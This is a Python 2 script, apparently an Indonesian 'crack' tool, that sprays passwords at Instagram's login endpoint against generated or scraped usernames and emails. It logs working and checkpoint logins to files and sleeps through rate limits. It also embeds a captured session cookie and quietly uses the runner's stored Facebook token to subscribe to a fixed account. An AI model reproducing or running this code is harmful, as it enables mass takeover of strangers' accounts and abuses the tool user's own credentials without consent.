#-*-coding:utf-8-*-
import requests, random, os, time,sys,json
from bs4 import BeautifulSoup as parser
from urllib2 import urlopen
logo = ("""\x1b[1;92m ___ ___ ___ __  __ ___ _   _ __  __
\x1b[1;92m| _ \ _ \ __|  \/  |_ _| | | |  \/  |
\x1b[1;96m|  _/   / _|| |\/| || || |_| | |\/| |
\x1b[1;96m|_| |_|_\___|_|  |_|___|\___/|_|  |_|
\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m——————————————————————————————
\x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m au : rozhak
\x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m fb : fb.com/rozhak.xyz
\x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m gh : github.com/rozhakxd
\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m——————————————————————————————
""")
useragent=random.choice(["Mozilla/5.0 (Linux; Android 10; SM-G960F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.50 Mobile Safari/537.36 Instagram 211.0.0.33.117 Android (26/10; 640dpi; 1440x2768; samsung; SM-G960F; starqltechn; qcom; it_IT; 327976425)",
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 210.0.0.16.67 (iPhone8,1; iOS 13_7; ru_RU; ru-RU; scale=2.00; 750x1334; 325544617) NW/3",
"Mozilla/5.0 (Linux; Android 11; RMX2193 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 Instagram 211.0.0.33.117 Android (30/11; 320dpi; 720x1448; realme; RMX2193; RMX2193; mt6768; fr_FR; 327976424)",
"Mozilla/5.0 (Linux; Android 10; Redmi 8 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 Instagram 211.0.0.33.117 Android (29/10; 320dpi; 720x1369; Xiaomi; Redmi 8; olive; qcom; ru_RU; 327976424)",
"Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-L01 Build/HUAWEITAG-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.50 Mobile Safari/537.36 Instagram 198.0.0.32.120 Android (22/5.1; 320dpi; 720x1184; HUAWEI; HUAWEI TAG-L01; HWTAG-L6753; mt6735; it_IT; 307053298)",
"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 Instagram 211.0.0.33.117 Android (29/10; 440dpi; 1080x2210; Xiaomi; Mi 9T Pro; raphael; qcom; ru_RU; 327976425)"])
link =("https://gramho.com")
url=('http://ipinfo.io/json')
response=urlopen(url)
data=json.load(response)
ip=data['ip']
region=data['region']
live = []
chek = []
die = []
stop = False
def menu_instagram():
	global ip, region
	try:
                token=open('___rozhak___','r').read()
        except IOError:
                print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid')
                time.sleep(2)
                login()
	try:
                otw = requests.get('https://graph.facebook.com/me?access_token=' +token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
                a = json.loads(otw.text)
		nama = a['name']
	except KeyError:
		print("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid")
		os.system('rm -rf ___rozhak___')
		time.sleep(2)
		login()
	os.system("clear")
	print(logo)
	print("\x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97m Ip : "+ip)
	print("\x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97m Nama : "+nama)
	print("\x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97m Region : "+region)

	print("\n\x1b[1;96m[\x1b[1;97m1\x1b[1;96m]\x1b[1;97m Crack Dari Username Huruf+Angka")
	print("\x1b[1;96m[\x1b[1;97m2\x1b[1;96m]\x1b[1;97m Crack Dari Username Huruf_Angka")
	print("\x1b[1;96m[\x1b[1;97m3\x1b[1;96m]\x1b[1;97m Crack Dari Email Nama+Angka")
	print("\x1b[1;96m[\x1b[1;97m4\x1b[1;96m]\x1b[1;97m Crack Dari Email Huruf")
	print("\x1b[1;96m[\x1b[1;97m5\x1b[1;96m]\x1b[1;97m Crack Dari Email Angka")
	print("\x1b[1;96m[\x1b[1;97m6\x1b[1;96m]\x1b[1;97m Crack Dari Query V1")
	print("\x1b[1;96m[\x1b[1;97m7\x1b[1;96m]\x1b[1;97m Crack Dari Query V2")
	print("\x1b[1;96m[\x1b[1;97m8\x1b[1;96m]\x1b[1;97m Lihat Hasil Crack")
	print("\x1b[1;97m[\x1b[1;93m0\x1b[1;97m]\x1b[1;93m Keluar")
	menu=raw_input("\n\x1b[1;92m[\x1b[1;97m#\x1b[1;92m]\x1b[1;97m Choose :\x1b[1;92m ")
	if menu == "":
		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
	elif menu == "1":
		nama=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama :\x1b[1;96m ").lower()
                pw=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Password :\x1b[1;96m ")
                print("\x1b[1;97m ")
                for i in range(1000):
                        number=random.randint(1, 999)
                        user=(nama+str(number))
			crack(user,pw)
	elif menu == "2":
                nama=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama :\x1b[1;96m ").replace(" ","_")
                pw=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Password :\x1b[1;96m ")
                print("\x1b[1;97m ")
                for i in range(100):
                        number=random.randint(1, 99)
                        user=(nama+"_"+str(number))
                        crack(user,pw)
	elif menu == "3":
		nama=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama :\x1b[1;96m ").lower()
                tipe=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Tipe Email :\x1b[1;96m ")
                pw=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Password :\x1b[1;96m ")
                print("\x1b[1;97m ")
                for i in range(1000):
                        number=random.randint(1, 999)
                        email=(nama+str(number)+tipe)
                        crack(email,pw)
	elif menu == "4":
                tipe=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Tipe Email :\x1b[1;96m ")
                print("\x1b[1;97m ")
                for i in range(1500):
                        low = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
                        b=random.randint(0,7)
                        low1 = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
                        b1=random.randint(0,7)
                        low2 = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
                        b2=random.randint(0,7)
                        low3 = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
                        b3=random.randint(0,7)
                        low4 = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
                        b4=random.randint(0,7)
                        low5 = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
                        b5=random.randint(0,7)
                        x=(low[b])
                        x1=(low1[b1])
                        x2=(low2[b2])
                        x3=(low3[b3])
                        x4=(low4[b4])
                        x5=(low5[b5])
                        count=random.choice([x+x1+x2,x+x1+x2+x3,x+x1+x2+x3+x4,x+x1+x2+x3+x4+x5])
                        huruf=(count)
                        email=(huruf+tipe)
                        pw=(huruf+"123")
                        crack(email,pw)
	elif menu == "5":
		domain=("@gmail.com")
                print("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Tipe Email :\x1b[1;96m "+domain)
                print("\x1b[1;97m ")
                for i in range(1500):
                        number=random.randint(111111, 999999)
                        em_angka=(str(number)+domain)
                        pw=(str(number))
                        crack(em_angka,pw)
	elif menu == "6":
		nama=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Query :\x1b[1;96m ").lower()
                pw=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Password :\x1b[1;96m ")
                print("\x1b[1;97m ")
                query().getquery(nama,pw)
	elif menu == "7":
		query_v2()
	elif menu == "8":
		print("\x1b[1;96m[\x1b[1;97m1\x1b[1;96m]\x1b[1;97m Lihat Hasil\x1b[1;92m Ok")
                print("\x1b[1;96m[\x1b[1;97m2\x1b[1;96m] Lihat Hasil\x1b[1;93m Cp")
                print("\x1b[1;97m[\x1b[1;93m0\x1b[1;97m]\x1b[1;93m Kembali")
                lihat = raw_input("\n\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Choose :\x1b[1;96m ")
                if lihat == "":
                        exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
                elif lihat == "1":
                        try:
                                ok=open('Insta_Ok.txt','r').read()
                        except IOError:
                                exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Hasil Ok Tidak Ada")
                        print("\x1b[1;92m"+ok)
                elif lihat == "2":
                        try:
                                cp=open('Insta_Cp.txt','r').read()
                        except IOError:
                                exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Hasil Cp Tidak Ada")
                        print("\x1b[1;93m"+cp)
                elif lihat == "0":
                        menu_instagram()
                else:
                        exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
	elif menu == "0":
		exit()
	else:
		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
def crack(username, password):
	print'\r\x1b[1;97m[Crack] Ok:%s - Cp:%s - Die:%s' % (len(live), len(chek), len(die)),
	sys.stdout.flush()
	url = "https://www.instagram.com/"
	sesi = requests.Session()
	header = {
		'Accept-Encoding': 'gzip, deflate',
		'Accept-Language': 'en-US,en;q=0.8',
		'Connection': 'keep-alive',
		'Content-Length': '0',
		'Host': 'www.instagram.com',
		'Referer': 'https://www.instagram.com/',
		'User-Agent': useragent,
		'X-Instagram-AJAX': '1',
		'X-Requested-With': 'XMLHttpRequest'
	}
	sesi.headers.update(header)
	sesi.cookies.update({
		'sessionid': '', 'mid': '', 'ig_pr': '1',
		'ig_vw': '1920', 'csrftoken': '',
		's_network': '', 'ds_user_id': ''
	})
	sesi.get('https://www.instagram.com/web/__mid')
	sesi.headers.update({'X-CSRFToken': sesi.cookies.get_dict()['csrftoken']})
	enc_pass = '#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(int(time.time()), password)
	data_post = {
		"username": username,
		"enc_password": enc_pass
	}
	try:
		req = sesi.post("https://www.instagram.com/accounts/login/ajax/", data=data_post, allow_redirects=True).json()
		if req["authenticated"] == True:
			print("\r\x1b[1;92m[Ok] "+username+"|"+password+"         ")
			live.append(username+"|"+password)
			save=open("Insta_Ok.txt", "a")
			save.write(username+"|"+password+"\n")
			save.close()
		else:
			print("\r\x1b[1;91m[Die] "+username+"|"+password+"         ")
			die.append(username+""+password)
	except KeyError:
		if "Please wait" in req["message"]:
			print("\r\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Crack Limit Silahkan Tunggu Sebentar...")
			time.sleep(120)
		else:
			print("\r\x1b[1;93m[Cp] "+username+"|"+password+"          ")
			chek.append(username+"|"+password)
			save=open("Insta_Cp.txt", "a")
                        save.write(username+"|"+password+"\n")
                        save.close()
class query:
	def getquery(self, search, password):
		url = link+"/search/"+search
		getData = requests.get(url, headers={"user-agent": useragent}).text
		htmlBeauti = parser(getData, "html.parser")
		for username in htmlBeauti.find_all("div", class_="result-username"):
			userid = username.text.replace("@","")
			crack(userid, password)
head = {
'HOST': "www.instagram.com",
'KeepAlive' : 'True',
'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
'Cookie': 'mid=YSnwAwABAAGcP8U__eZOXNfoDJdA; ig_did=5C47028B-01A6-40CF-A8CB-0C22E54A0D37; ig_nrcb=1; fbm_124024574287414=base_domain=.instagram.com; fbsr_124024574287414=TFQpfhizsCMxS9eNZynAdlP7E5xwyP0dqHvPagKil2E.eyJ1c2VyX2lkIjoiMTAwMDM2NTA2MTk4NjI4IiwiY29kZSI6IkFRQTYwMWNpd0VTSXVuQ1hITldyTHlKR1JjMEFySGtQMm1WWVoxbWxwdDQtWkhjQkhJR1JrZFJsZ2dnX3FHWURib2xvbkxzbDA5VnNvYi0zTzc2UjI4ZFR3ZHMzc1VmazBzbnQwNF9HLUw5bWNXQ1d6czFSREQ3N3JmeXVVdGVwaXZ0RGVoZFhPNXBCTGVpcU1ZZHhSU2FKSE9fSExJX0ZqOHlKWWVMWmdHMmdRNlNKZTJnUHpxa3Z4RFVralFPdEhTaWUtTDNNTHdFRS1SbGpveEJCNm5abnNlYTRTUE95Z0xzQ2RlRlhSZXBDWnNBV1ZqbmZDZFo1NUk4VWtCVDNkbUxScEVJdURnZTBOX2RwbzA4aVppTVFPUU8yVHhKeFdERk1kWE8tS296cUowbFpzLWdQV3Vvb0R1WGk0UHp1b1NFbWU0aE8yMHdVNTkxM0hETFQ5em9tIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUxLNWNmc0VuZktzM0k0OVQxRFpBdjlISzY3a2VBY3VTS2xIOHBNaGMxeFJnektveklvd1BXdFZqQkpBWkNnZ1A3Y09GZXlyTGN6NWpjeDBIY0VXUlBkcXlYWkFHajFJQkUzWkM3REVhUXBHMjZEV2FQWkFFNXlFcWxsdjZKbzNySHN0TjRNWDE4T2ZMNVNZWkNJWkJjakVsSjhaQlNJajM3c0Q3S2lPUnVXRkcyQXlKR0htYnF0amMxdElaQXZhU3JBWkRaRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjMxOTI3MzkxfQ; ds_user_id=14958828655; csrftoken=UvDJ8XTfXCNQ2qnmoRui10iLQETDX2W3; sessionid=14958828655%3AAJmi00Y476z5Hj%3A12; shbid="9776\05414958828655\0541663463393:01f7181afc78a3771c0c86d394d5b2965ee08f264fd795effa6578839bd3b7cc51ff0a62"; shbts="1631927393\05414958828655\0541663463393:01f7e6f65ebf92959d2b7851ec21c720d4c0fb15c10ed2ef19aa3f07370fba0de34a7300"; rur="EAG\05414958828655\0541663472958:01f767d0ebf0d584e79b15a13262eaa8c14a66e16073dd934e41645a537fa8ae1174dff5"',
'Accept' : "*/*",
'ContentType' : "application/x-www-form-urlencoded",
"X-Requested-With" : "XMLHttpRequest",
"X-IG-App-ID": "936619743392459",
"X-Instagram-AJAX" : "missing",
"X-CSRFToken" : "missing",
"Accept-Language" : "en-US,en;q=0.9"
}
def query_v2():
        try:
                query=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Query :\x1b[1;96m ").lower()
		limit=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Limit :\x1b[1;96m ")
                pw=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Password :\x1b[1;96m ")
		print("\x1b[1;97m ")
		ruks = requests.Session()
                url_id = 'https://www.instagram.com/web/search/topsearch/?context=blended&query=25.'+query
                mn = 0
                req_id = ruks.get(url_id,headers=head).json()
                while True:
                        mn+=1
                        y = str(req_id['users'][mn]['user']['username'])
                        crack(y,pw)
        except Exception as e:
		print("\n\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Dump Limit Crack Selesai...")
